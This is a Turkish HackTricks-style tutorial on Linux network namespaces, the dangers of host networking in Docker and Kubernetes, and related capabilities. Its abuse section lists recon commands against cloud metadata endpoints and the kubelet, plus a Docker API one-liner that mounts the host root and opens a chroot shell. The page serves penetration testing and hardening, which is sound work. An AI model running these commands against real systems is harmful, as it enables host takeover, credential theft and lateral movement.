# Ağ Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Ağ namespace'i, arayüzler, IP adresleri, yönlendirme tabloları, ARP/komşu durumu, firewall kuralları, soketler ve `/proc/net` gibi dosyaların içerikleri gibi ağla ilgili kaynakları izole eder. Bu yüzden bir container, host'un gerçek ağ yığınına sahip olmadan kendi `eth0`'ına, kendi yerel yönlendirmelerine ve kendi loopback aygıtına sahipmiş gibi görünebilir.

Güvenlik açısından bu önemlidir çünkü ağ izolasyonu yalnızca port bağlamaktan çok daha fazlasıdır. Özel bir ağ namespace'i, iş yükünün doğrudan gözlemleyebileceği veya yeniden yapılandırabileceği şeyleri sınırlar. Bu namespace host ile paylaşıldığında, container aniden host dinleyicilerine, host-yerel servislere ve uygulamaya açılmaması gereken ağ kontrol noktalarına görünürlük kazanabilir.

## İşleyiş

Yeni oluşturulmuş bir ağ namespace'i, arayüzler ona eklenene kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Container runtime'ları daha sonra sanal arayüzler oluşturur veya bağlar, adres atar ve iş yükünün beklendiği bağlantıya sahip olması için yönlendirmeleri yapılandırır. Bridge tabanlı dağıtımlarda bu genelde container'ın bir host bridge'e bağlı veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te CNI plugin'leri Pod networking için eşdeğer kurulumu gerçekleştirir.

Bu mimari, `--network=host` veya `hostNetwork: true`'nın neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazırlanmış özel bir ağ yığını almak yerine, iş yükü host'un gerçek ağ yığınına katılır.

## Lab

Neredeyse boş bir ağ namespace'ini şu komutla görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ve normal ile host-networked container'ları şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host ağını kullanan container artık kendi izole soket ve arayüz görünümüne sahip değildir. Bu değişiklik, süreç hangi yeteneklere sahip olduğu sorulmadan bile zaten önemli bir fark yaratır.

## Çalışma Zamanı Kullanımı

Docker ve Podman normalde aksi yapılandırılmadıkça her container için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace, Pod içindeki container'lar tarafından paylaşılır ama host'tan ayrıdır. Incus/LXC sistemleri de genellikle daha çeşitli sanal ağ kurulumlarıyla birlikte zengin network-namespace tabanlı izolasyon sağlar.

Genel ilke, özel ağın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça çıkış yapma seçeneğidir.

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma, basitçe host network namespace'ini paylaşmaktır. Bu bazen performans, düşük seviyeli monitoring veya kullanım kolaylığı için yapılır, ancak container'lar için mevcut en temiz sınırlandırmalardan birini ortadan kaldırır. Host-local dinleyiciler daha doğrudan erişilebilir hale gelir, sadece localhost'a bağlı servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetenekler çok daha tehlikeli olur çünkü etkinleştirdikleri işlemler artık host'un kendi ağ ortamına uygulanır.

Ayrıca, network namespace özel olsa bile ağla ilgili yeteneklerin fazla verilmesi başka bir sorundur. Özel bir namespace yardımcı olur, ancak raw soketleri veya gelişmiş ağ kontrolünü zararsız hale getirmez.

Kubernetes'te `hostNetwork: true` ayrıca Pod düzeyindeki ağ segmentasyonuna ne kadar güvenebileceğinizi değiştirir. Kubernetes, birçok network eklentisinin `hostNetwork` Pod trafiğini `podSelector` / `namespaceSelector` eşleştirmesi için doğru şekilde ayırt edemediğini ve bu trafiği sıradan node trafiği gibi değerlendirdiğini belgelendirir. Bir saldırgan bakış açısından bu, ele geçirilmiş bir `hostNetwork` iş yükünün genellikle overlay-network iş yükleriyle aynı politika varsayımlarıyla hâlâ kısıtlı olan normal bir Pod yerine node seviyesinde bir ağ ayağı (foothold) olarak ele alınması gerektiği anlamına gelir.

## Kötüye Kullanım

Zayıf izole edilmiş kurulumlarda, saldırganlar host'un dinlediği servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına ulaşabilir, trafiği sniff'leyebilir veya çevreye ve sahip olunan yeteneklere bağlı olarak trafiğe müdahale edebilir ya da `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster içinde bu, yanlara hareketi ve kontrol düzlemi keşfini de kolaylaştırabilir.

Host networking'den şüpheleniyorsanız, görünür arayüzlerin ve dinleyicilerin izole bir container ağına değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Sadece loopback hizmetleri genellikle ilk ilginç keşiflerdir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ağ yetenekleri mevcutsa, iş yükünün görünen stack'i inceleyip değiştirebilip değiştiremeyeceğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Modern çekirdeklerde, host networking ile birlikte `CAP_NET_ADMIN` basit `iptables` / `nftables` değişikliklerinin ötesinde paket yolunu da açığa çıkarabilir. `tc` qdiscs ve filters de namespace kapsamında olduğundan, paylaşılan bir host network namespace'inde container'ın görebildiği host interface'lerine uygulanırlar. Ek olarak `CAP_BPF` mevcutsa, TC ve XDP loader'ları gibi ağla ilgili eBPF programları da önem kazanır:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Bu önemlidir çünkü bir saldırgan host arayüz düzeyinde traffic'i yansıtabilir, yönlendirebilir, şekillendirebilir veya düşürebilir; sadece firewall kurallarını yeniden yazmakla kalmaz. Private network namespace içinde bu eylemler container görünümüyle sınırlıdır; shared host namespace içinde ise host'u etkileyen hale gelir.

Cluster veya cloud ortamlarında, host networking ayrıca metadata ve control-plane-adjacent hizmetlerin hızlı yerel recon'unu haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Tam Örnek: Host Networking + Local Runtime / Kubelet Access

Host networking otomatik olarak host root sağlamaz, ancak sıklıkla yalnızca node'un kendisinden erişilebilir olması amaçlanmış servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir privilege-escalation yolu haline gelir.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost'taki Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etkiler:

- yerel bir runtime API'si uygun şekilde korunmamışsa doğrudan host ele geçirilmesi
- kubelet veya yerel ajanlara erişilebiliyorsa cluster reconnaissance veya lateral movement
- `CAP_NET_ADMIN` ile birleştirildiğinde trafik manipülasyonu veya denial of service

## Kontroller

Bu kontrollerin amacı, işlemin özel bir ağ yığını olup olmadığını, hangi rotaların ve dinleyicilerin görünür olduğunu ve ağ görünümünün yetenekleri test etmeden önce zaten host-benzeri görünüp görünmediğini öğrenmektir.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Eğer `/proc/self/ns/net` ve `/proc/1/ns/net` zaten host-benzeri görünüyorsa, container host network namespace'i veya başka bir özel olmayan namespace ile paylaşımda olabilir.
- `lsns -t net` ve `ip netns identify`, shell zaten isimlendirilmiş veya kalıcı bir namespace içindeyken ve bunu host tarafındaki `/run/netns` nesneleriyle ilişkilendirmek istediğinizde faydalıdır.
- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim endpoint'lerini ortaya çıkarır.
- Rotalar, arayüz isimleri, firewall bağlamı, `tc` durumu ve eBPF iliştirmeleri, `CAP_NET_ADMIN`, `CAP_NET_RAW` veya `CAP_BPF` mevcutsa çok daha önemli hale gelir.
- Kubernetes'te, bir `hostNetwork` Pod'undan gelen servis-adı çözümleme hatası, servisin yok olduğunu değil, Pod'un `dnsPolicy: ClusterFirstWithHostNet` kullanmıyor olduğunu gösterebilir.

Bir container'ı incelerken network namespace'i her zaman capability seti ile birlikte değerlendirin. Host networking ile güçlü network yetkileri, bridge networking ile dar bir varsayılan yetki setinden çok farklı bir duruş sergiler.

## Referanslar

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
